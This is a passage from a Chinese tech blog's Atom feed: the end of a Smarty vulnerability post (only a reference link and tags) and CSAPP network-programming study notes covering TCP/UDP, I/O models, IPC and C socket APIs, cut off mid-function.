rel="noopener">https://www.smarty.net/docs/zh_CN/</a></p><p>暂时没想到利用场景，后期有缘遇到再继续深入吧。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞分析/" target="_blank" rel="noopener">https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;smarty 模板的使用比较简单，主要有两个核心函数。一个是 &lt;code&gt;assign()&lt;/code&gt;，把模板中要使用的数据进行欲赋值，一
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="smarty" scheme="https://wywwzjj.top/tags/smarty/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 网络编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/"/>
    <id>https://wywwzjj.top/2019/12/02/CSAPP-Chapter-11-Notes/</id>
    <published>2019-12-02T13:27:57.000Z</published>
    <updated>2020-03-22T10:11:48.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实践项目"><a href="#实践项目" class="headerlink" title="实践项目"></a>实践项目</h2><p>实现一个 telnet 版本的聊天服务器，主要有以下需求。</p><ul><li>每个客户端可以用使用 <code>telnet ip:port</code> 的方式连接到服务器上。</li><li>新连接需要用用户名和密码登录，如果没有，则需要注册一个。</li><li>然后可以选择一个聊天室加入聊天。</li><li>管理员有权创建或删除聊天室，普通人员只有加入、退出、查询聊天室的权力。</li><li>聊天室需要有人数限制，每个人发出来的话，其它所有的人都要能看得到。</li></ul><p>实现一个简单的 HTTP 服务器，主要有以下需求。</p><ul><li>解释浏览器传来的 HTTP 协议，只需要处理 URL path。</li><li>然后把所代理的目录列出来。</li><li>在浏览器上可以浏览目录里的文件和下级目录。</li><li>如果点击文件，则把文件打开传给浏览器（浏览器能够自动显示图片、PDF，或 HTML、CSS、JavaScript 以及文本文件）。</li><li>如果点击子目录，则进入到子目录中，并把子目录中的文件列出来。</li></ul><p>实现一个生产者 / 消费者消息队列服务，主要有以下需求。</p><ul><li>消息队列采用一个 Ring-buffer 的数据结构。</li><li>可以有多个 topic 供生产者写入消息及消费者取出消息。</li><li>需要支持多个生产者并发写。</li><li>需要支持多个消费者消费消息（只要有一个消费者成功处理消息就可以删除消息）。</li><li>消息队列要做到不丢数据（要把消息持久化下来）。</li><li>能做到性能很高。</li></ul><p>v2ray 文档 <a href="https://www.v2ray.com/developer/intro/roadmap.html" target="_blank" rel="noopener">https://www.v2ray.com/developer/intro/roadmap.html</a></p><p>自己实现一个 socks5</p><p>Python： <a href="https://hatboy.github.io/2018/04/28/Python编写socks5服务器" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8</a></p><p>C：<a href="https://www.cayun.me/网络/用c语言写一个socks5代理服务器/" target="_blank" rel="noopener">https://www.cayun.me/%E7%BD%91%E7%BB%9C/%E7%94%A8c%E8%AF%AD%E8%A8%80%E5%86%99%E4%B8%80%E4%B8%AAsocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</a> </p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>早起 TCP/IP 被移植到 UNIX 平台时，设计者们希望像访问文件一样去访问网络。</p><p>Linux 提供了三种类型套接口：</p><ul><li>流式套接口（SOCK_STREAM）</li></ul><p>提供了可靠的双向顺序数据流连接。</p><ul><li>数据报套接口（SOCK_DGRAM）</li></ul><p>提供双向的数据传输。</p><ul><li>原始套接口（SOCK_RAW）</li></ul><p>这种套接口允许进程直接存取下层的协议。</p><p><strong>现在全世界的人都在解决 C10K 问题。</strong></p><p><a href="http://www.kegel.com/c10k.html" target="_blank" rel="noopener">http://www.kegel.com/c10k.html</a></p><p>翻译版：<a href="https://www.oschina.net/translate/c10k" target="_blank" rel="noopener">https://www.oschina.net/translate/c10k</a></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>TCP 与 UDP 的异同？</p><p>  面向连接的可靠传输，有重传机制，还有流量控制、拥塞控制</p><p>  面向无连接的不可靠传输，以带数据边界的数据报形式传送，速度快</p></li><li><p>TCP 连接的特点和基本流程，何谓“三次握手”？</p><p>  A = seq1 =&gt; B</p><p>  B = seq1 + 1 / seq2=&gt; A</p><p>  A = seq2 + 1 =&gt; B</p></li><li><p>简述 OSI 七层模型和 TCP/IP 模型的异同</p><p>  OSI  参考模型只是一个抽象的理论模型，TCP/IP 是实际网络应用中的经验产物，它与 OSI 的四层相关联。</p></li><li><p>二倍 msl（maximum segment lifetime） 作用？</p><p>  结合四次挥手可以很清晰的看到：</p><ul><li>可靠的实现 TCP 全双工连接的终止（保证最后一次 ack 到达）</li><li>允许老的重复报文在网络中的消逝（旧报文到达导致重复建立连接）</li></ul></li><li><p>简述 C/S 的运行模型。</p><p>  即客户端与服务端运行模型，服务端为客户端提供服务，一直等待客户请求；</p><p>  客户端向服务端发出请求，并等待响应结果。</p></li></ul><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><ul><li><p>listen 监听列表满了怎么办？</p><p>  TCP 将忽略客户传来的 SYN 分节，不发送 RST，客户端将重发 SYN。</p></li><li><p>在调用 select 函数时，如何使得进程跳出阻塞状态？</p><p>  设置信号处理函数、直接指定时间？</p></li><li><p>shutdown、close 区别？</p><p>  close：将套接口描述字引用计数器减一，计数器为零套接口才会关闭，并且终止了读写两个方向。</p><p>  shutdown：不管引用计数器为何值，直接终止网络连接，可单独指定终止读、写。</p></li><li><p>网络编程时，为什么要考虑字节顺序问题？</p><p>  因为网络字节序与主机字节序不一致。</p></li><li><p>编程实现：TCP，客户机产生两个随机数，发给两个服务器，A将两数相加，B相减，分别将结果返给客户机。</p></li><li><p>简述 socket API 的差别：</p><p>  send、write、writev、sendto、sendmsg</p></li><li><p>什么是多路复用 select，给出一个典型应用</p><p>  内核发现进程指定的一个或多个I/O条件就绪，就通知进程。典型：多个描述字多路复用，比如交互式输入和网络套接字。</p></li><li><p>出现粘包如何处理？</p></li></ul><h2 id="UDP与原始套接口"><a href="#UDP与原始套接口" class="headerlink" title="UDP与原始套接口"></a>UDP与原始套接口</h2><ul><li><p>UDP协议中发送数据大于缓冲区大小，系统如何处理，说明理由。</p><blockquote><p>UDP将直接丢弃这个数据报，并且不发送任何报错信息。</p></blockquote></li><li><p>UDP协议与TCP协议的服务器在处理客户端请求时有何异同？</p><p>  UDP采用循环服务器的工作方式，它仅有的单个套接口用于接收所有到达的数据报，并发回所有的响应，UDP套接口有一个接收缓冲区用于存放到来的数据报。</p></li><li><p>与 TCP 中的 connect 有何差别？</p><p>  UDP 不需要建立连接，使用 connect 只是记录目的方的IP与端口，调用后，可直接 <code>read</code>、<code>write</code>。</p><p>  而且这里的 read 将不会受到来自其他主机的应答。</p></li><li><p>如何避免UDP协议下客户端将非服务端发送的应答，误认为是服务器应答?</p><ul><li>通过 recvfrom 里返回的 IP 与端口区分</li><li>使用 connect</li></ul></li><li><p>简述ping程序的功能与实现原理。</p><p>  利用原始套接口发送 icmp 回射请求，等待对方的应答，应答中包含请求的标识符、序列号、时间戳</p></li><li><p>简述traceroute程序的功能与实现原理。</p><p>  首先发送 ttl 为1的 udp 数据报，然后逐次递增ttl，确定下一跳的路由。</p><p>  当 icmp 报文到达目标主机时，目标主机返送一个 icmp 错误，显示端口不可达。</p></li></ul><h2 id="带外数据"><a href="#带外数据" class="headerlink" title="带外数据"></a>带外数据</h2><ul><li><p>什么是带外数据？TCP 协议支持多少个字节的带外数据？</p><blockquote><p>若连接的某端发生了重要的事情，希望迅速通知对端，这种通知要在发送缓存数据前发送。</p><p>带外数据并不要求在客户与服务器间再使用一个连接，而是映射到已有的连接中。</p><p>只支持一个字节</p></blockquote></li><li><p>试给出一个使用带外数据提供的服务。</p><blockquote><p>心搏函数。</p></blockquote></li><li><p>TCP 有没有为紧急数据提供单独的数据信道，它是如何实现带外数据传输的？</p><blockquote><p>TCP 没有单独的通道，而是使用的紧急模式实现的。</p></blockquote></li><li><p>TCP 发送和接收带外数据有哪些方法？</p><ul><li><code>send(sockfd, &#39;A&#39;, 1, MSG_OOB)</code></li></ul></li><li><p>SIGURG 信号处理函数</p><ul><li>select 异常集合接收</li><li>带外标志读取</li></ul></li><li><p>TCP 协议收到一个新的紧急指针时，将通知接收进程，有哪些通知方法？</p><p>  SIGURG 信号、select</p></li><li><p>如果进程设置了 SO_OOBINLINE 选项，能否通过设置 MSG_OOB 标志来读取带外数据？为什么？应该采用什么方式读取带外数据？</p><p>  不能，SO_OOBINLINE 选项表示将紧急数据留到普通的套接口缓冲区，所以正常的 read 就行了。</p><p>  可通过 sockatmark 读取带外标识位置。</p></li></ul><h2 id="阻塞与非阻塞"><a href="#阻塞与非阻塞" class="headerlink" title="阻塞与非阻塞"></a>阻塞与非阻塞</h2><h3 id="为什么会阻塞？"><a href="#为什么会阻塞？" class="headerlink" title="为什么会阻塞？"></a>为什么会阻塞？</h3><p>两个缓冲区：内核缓冲区、进程缓冲区，当内核缓冲区未满足时，该进程将被投入休眠。</p><h3 id="什么是非阻塞？"><a href="#什么是非阻塞？" class="headerlink" title="什么是非阻塞？"></a>什么是非阻塞？</h3><blockquote><p>将一个套接口设为非阻塞 =&gt; 通知内核，当所请求的 I/O 操作未满足时，不要阻塞该进程，而是返回一个错误</p></blockquote><p>优点：当 I/O 操作不能立即完成时，进程还可以继续后续的操作，提高自身运行效率。</p><p>缺点：进程一直处于运行状态，可能占用大量CPU时间，影响其他进程的运行效率。</p><h3 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h3><p><strong>非阻塞connect三个用途</strong></p><ul><li>完成connect需要花一个RTT时间，局域网的几毫秒到广域网的几秒。此期间可以将三次握手迭合在其他处理上</li><li>利用非阻塞 connect 技术同时建立多个连接</li><li>利用 select 指定时间限制，缩短connect的超时（很多实现中connect超时为75秒到数分钟）</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.设置套接口为非阻塞</span><br><span class="line">2.发起非阻塞 connect</span><br><span class="line">3.等待连接建立期间完成其他事情</span><br><span class="line">4.检查连接是否立即建立</span><br><span class="line">5.调用 select</span><br><span class="line">6.处理 select 超时</span><br><span class="line">7.检查可读可写条件，调用 getsockopt 查看连接是否成功</span><br><span class="line">8.关闭非阻塞状态并返回</span><br></pre></td></tr></table></figure><h3 id="I-O-复用"><a href="#I-O-复用" class="headerlink" title="I/O 复用"></a>I/O 复用</h3><blockquote><p>可等待多个描述字的就绪</p></blockquote><h3 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h3><blockquote><p>内核在描述字就绪时，发送 SIGIO 信号通知进程</p></blockquote><p>绑定信号以及对应的处理函数 =&gt; 继续执行其他操作 =&gt; 满足后自动处理</p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><blockquote><p>告知内核启动某个操作，并让内核在整个操作完成（包括将数据从内核拷贝到进程缓冲区里）后通知</p><p>与信号驱动的区别：</p><ul><li>信号驱动：由内核通知何时可以启动一个 I/O 操作</li><li>异步：由内核通知 I/O 何时完成</li></ul></blockquote><p><code>aio_read</code> 给内核传递描述字、缓冲区指针、缓冲区大小、文件偏移，并告诉内核当操作完成时如何通知进程。</p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><ul><li><p>哪种情况下适合采用阻塞式I/O编程？</p><p>  访问一个或多个服务进程时，各访问之间有顺序关系</p></li><li><p>非阻塞与阻塞在 CPU 利用率上有什么区别</p><p>  阻塞期间不占用 CPU 时间，不影响其他进程的工作效率，进程可能长时间处于休眠，在此期间进程不能执行别的任务，进程自身的效率不高。</p><p>  非阻塞，进程还可以执行后续的任务，提高自身的工作效率，进程一直处于执行期间，可能占用大量CPU时间来检测IO操作是否完成，影响其他进程的执行效率。</p></li><li><p>哪些套接口会发生阻塞</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据发送 发送缓冲区没有空间</span></span><br><span class="line">sendmsg, sendto, send, write, writev</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 数据接收，接收缓冲区没有空间</span></span><br><span class="line">recvmsg, recvfrom, recv, read, readv</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 完成三次握手</span></span><br><span class="line">connect</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无新连接到达</span></span><br><span class="line">accept</span><br></pre></td></tr></table></figure></li></ul><h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><blockquote><p>局限于局域网内使用</p></blockquote><ul><li><p>资源发现</p><p>  在本地子网中定位一个服务器主机，寻找其 IP 地址（例如 ARP、DHCP）</p></li><li><p>节约带宽</p><p>  在有多个客户机与单个服务器机通信的局域网环境中尽量减少分组流量。</p></li></ul><h2 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h2><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><blockquote><p>局域网、跨广域网都可使用</p></blockquote><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><ul><li><p>与广播的区别，以及分别的应用场景</p><ul><li>广播是向网络中所有主机发送信息</li><li>广播由于是向全网发，其他无关主机都会收到，而且要到传输层才能处理，浪费网络、计算资源</li><li>广播应用实例：网络时间协议</li></ul></li></ul><h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><p>常见信号及其默认动作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SIGABRT异常终止（abort）  终止</span><br><span class="line">SIGFPE算术异常（除以0）终止</span><br><span class="line">SIGUSR1用户定义信号 忽略</span><br><span class="line">SIGUSR2同上</span><br><span class="line">SIGHUP连接断开（送给控制进程） 终止</span><br><span class="line">SIGALRM计时器到时（alarm）终止</span><br><span class="line">SIGCHLD 子进程状态改变忽略</span><br><span class="line">SIGURG紧急数据到达 忽略</span><br><span class="line">SIGIO异步I/O   终止</span><br><span class="line">SIGINT终端中断符 终止</span><br><span class="line">SIGPIPE写至无读进程的管套   终止</span><br><span class="line">SIGKILL 终止进程  终止</span><br></pre></td></tr></table></figure><h3 id="管道与-FIFO"><a href="#管道与-FIFO" class="headerlink" title="管道与 FIFO"></a>管道与 FIFO</h3><ul><li>管道可用于具有亲缘关系进程间的通信</li><li>命令管道克服了管道没有名字的限制，命名管道允许无亲缘关系进程间的通信</li></ul><h3 id="UNIX-域协议"><a href="#UNIX-域协议" class="headerlink" title="UNIX 域协议"></a>UNIX 域协议</h3><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><h4 id="消息通信"><a href="#消息通信" class="headerlink" title="消息通信"></a>消息通信</h4><blockquote><p>消息通信通过消息队列实现进程通信</p></blockquote><ul><li>消息队列是消息的链接表</li><li>有足够的权限的进程可以向队列中添加消息，被赋予读权限的进程可以读取队列中的消息</li><li>消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等特点</li><li>消息队列不需要进程间具有亲缘关系</li></ul><h4 id="信号与信号量"><a href="#信号与信号量" class="headerlink" title="信号与信号量"></a>信号与信号量</h4><ul><li>用于通知接受进程有某事件发生</li><li>进程可以发送信号给进程本身</li><li>信号 =&gt; 信号量，能使用多次？</li></ul><h4 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h4><blockquote><p>进程能够不涉及内核而访问其中的数据</p></blockquote><ul><li>使用多个进程可以访问同一块内存空间，是单机最快的可用 IPC 形式</li><li>针对其他通信机制运行效率较低而设计的，往往与其他通信机制结合来达到进程间的同步和互斥，如信号量</li></ul><h3 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h3><ul><li>命名管道、管道的区别<ul><li>命名管道以 FIFO 的形式存在于文件系统中，与 FIFO 创建进程无亲缘关系的进程只要能访问该路径，就能彼此通信</li><li>管道在最后一个关闭后自动消失，而 FIFO 需要通过 unlink 删除</li></ul></li></ul><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><h3 id="IO-多路复用"><a href="#IO-多路复用" class="headerlink" title="IO 多路复用"></a>IO 多路复用</h3><blockquote><p>异步I/O模型的发展技术是： select -&gt; poll -&gt; epoll -&gt; aio -&gt; libevent -&gt; libuv。Unix/Linux用了好几十年走过这些技术的变迁，然而，都不如 Windows I/O Completion Port 设计得好（免责声明：这个观点纯属个人观点。相信你仔细研究这些I/O模型后，你会得到你自己的判断）。 </p></blockquote><h4 id="一个线程维护多个-Socket"><a href="#一个线程维护多个-Socket" class="headerlink" title="一个线程维护多个 Socket"></a>一个线程维护多个 Socket</h4><p>由于 socket 是文件描述符，因而某个线程盯的所有的 socket，都放在一个文件描述符集合 fd_set 中，这就是项目进度强，然后调用 select 函数来监听文件描述符集合是否有变化。一旦有变化，就会依次查看每个文件描述符。那些发生变化的文件描述符在 fd_set 中对应的位都设为 1，表示 socket 可读或者可写，从而可以进行读写操作，然后再调用 select，接着盯下一轮的变化。</p><h4 id="从“派人盯着”到”有事通知“"><a href="#从“派人盯着”到”有事通知“" class="headerlink" title="从“派人盯着”到”有事通知“"></a>从“派人盯着”到”有事通知“</h4><p>上面的方式在文件描述符有变化时，都会采用轮询的方式确定具体是哪个 socket 有变化，也就是需要将全部项目都过一遍的方式来查看进度，这就大大影响了一个项目组能够支撑的最大的项目数量。因而使用 select，能够同时盯的项目数量由 FD_SETSIZE 限制。</p><p>如果改成事件通知的方式，情况就会好很多。（select 里不能返回具体是哪个 socket 变化了？）</p><p>最终方式：epoll + callback</p><p>AIO： Asynchronous IO ，异步非阻塞</p><p>BIO：Block-io，同步且阻塞式IO</p><p>NIO：Non-block IO，同步非阻塞</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>int to char array</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">"%d"</span>, num);</span><br></pre></td></tr></table></figure><p>端口复用（注意放到 bind 前面）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt));</span><br></pre></td></tr></table></figure><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><blockquote><p>#include &lt;linux/sock.h&gt;</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通用型套接字地址结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> sa_family;  <span class="comment">// 地址类型，AF_xxx，2 个字节</span></span><br><span class="line">    <span class="keyword">char</span> sa_data[<span class="number">14</span>];   <span class="comment">// 协议地址，14 个字节</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ipv4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family;<span class="comment">// 地址类型：AF_INET</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port;<span class="comment">// 端口号，16 位 TCP/UDP 端口号网络字节顺序</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span><span class="comment">// 32 位地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字节操纵</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span>* s, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// n 个字节置零</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bcopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* src, <span class="keyword">void</span>* dest, size_n)</span></span>;<span class="comment">// 拷贝 n 个字节</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* s1, <span class="keyword">const</span> <span class="keyword">void</span>* s2, <span class="keyword">size_t</span> n)</span></span>; <span class="comment">// 相等返回 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> c, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 将目标中n个字节设置为值c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 拷贝字符串中n个字节</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *s1, <span class="keyword">const</span> <span class="keyword">void</span> *s2, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 字符串比较，相等返回0；不等返回非0</span></span><br></pre></td></tr></table></figure><p>IP 地址转换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* h 表示 host，n 表示 network，l 表示 32 位整数，s 表示 16 位短整数 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 点分十进制字符串 =&gt; 网络字节顺序二进制值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp, struct in_addr *inp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点分十进制字符串 =&gt; 网络字节顺序二进制值</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">inet_addr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp)</span></span>;</span><br><span class="line"><span class="comment">// 以255.255.255.255表示出错，不能表示此广播地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络字节顺序二进制值 =&gt; 点分十进制字符串</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">inet_ntoa</span><span class="params">(struct in_addr in)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af, <span class="keyword">const</span> <span class="keyword">char</span> * strptr, <span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回1；输入无效表达式格式返回0；出错返回-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">inet_ntop</span><span class="params">(<span class="keyword">int</span> af, <span class="keyword">const</span> <span class="keyword">void</span> * strptr, <span class="keyword">char</span> *dst, <span class="keyword">size_t</span> cnt)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回结果指针dst；出错返回NULL</span></span><br></pre></td></tr></table></figure><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>socket</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// domain：协议族。type：套接口类型，protocol：协议类型</span></span><br><span class="line"><span class="comment">// 返回值：-1 出错，非负值则为套接口描述字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socketpair</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, <span class="keyword">int</span> fd_array[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure><p>bind</p><blockquote><p>将套接口指定IP、port，可两者都指定，也可都不指定；</p><p>服务端通常在启动时绑上端口；</p><p>客户端通常不绑定端口，由内核分配临时端口；</p><p>可通过 <code>getsockname</code> 来返回协议地址。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *my_addr, <span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成功则返回0，失败返回-1</span></span><br></pre></td></tr></table></figure><p>listen</p><blockquote><p>监听本地地址和端口</p><p>套接口状态：closed =&gt; listen</p><p>sockfd－已绑定的socket描述符<br>backlog－已完成连接、等待接收的队列长度，LISTENQ？</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成功则返回0，失败返回-1，错误原因存于errno</span></span><br></pre></td></tr></table></figure><p>accept</p><blockquote><p>当服务请求到达 accept 监视的 socket（监听套接口）时，系统将自动建立一个新的 socket（已连接套接口），并将此 socket 和客户进程连接起来。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, sockaddr* cliaddr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="收发"><a href="#收发" class="headerlink" title="收发"></a>收发</h3><blockquote><p>#include &lt;unistd.h&gt;</p></blockquote><p>read</p><blockquote><p>从套接口接收缓冲区中读取len字节的数据，成功返回，返回值是实际读取数据的字节数</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回值：</span></span><br><span class="line"><span class="comment">无数据=&gt;阻塞</span></span><br><span class="line"><span class="comment">n &gt;= len    =&gt;  len</span></span><br><span class="line"><span class="comment">n &gt; 0 &amp;&amp; n &lt; len=&gt; 读取 n 个</span></span><br><span class="line"><span class="comment">n = 0  =&gt;   读通道关闭</span></span><br><span class="line"><span class="comment">n &lt; 0  =&gt;  出错或异常</span></span><br><span class="line"><span class="comment">n = -1, errno == EINTR   =&gt;  读中断引起错误</span></span><br><span class="line"><span class="comment">n = -1, errno == ECONNREST =&gt;  网络连接有问题</span></span><br><span class="line"><span class="comment">read 函数要求操作系统内核从套接字描述字 socketfd读取最多多少个字节（size），并将结果存储到 buffer 中。返回值告诉我们实际读取的字节数目，也有一些特殊情况，如果返回值为 0，表示 EOF（end-of-file），这在网络中表示对端发送了 FIN 包，要处理断连的情况；如果返回值为 -1，表示出错。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从 socketfd 描述字中读取 "size" 个字节. */</span></span><br><span class="line"><span class="keyword">ssize_t</span> readn(<span class="keyword">int</span> fd, <span class="keyword">void</span> *vptr, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="keyword">size_t</span>  nleft = size;</span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line">    <span class="keyword">char</span>* ptr = vptr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        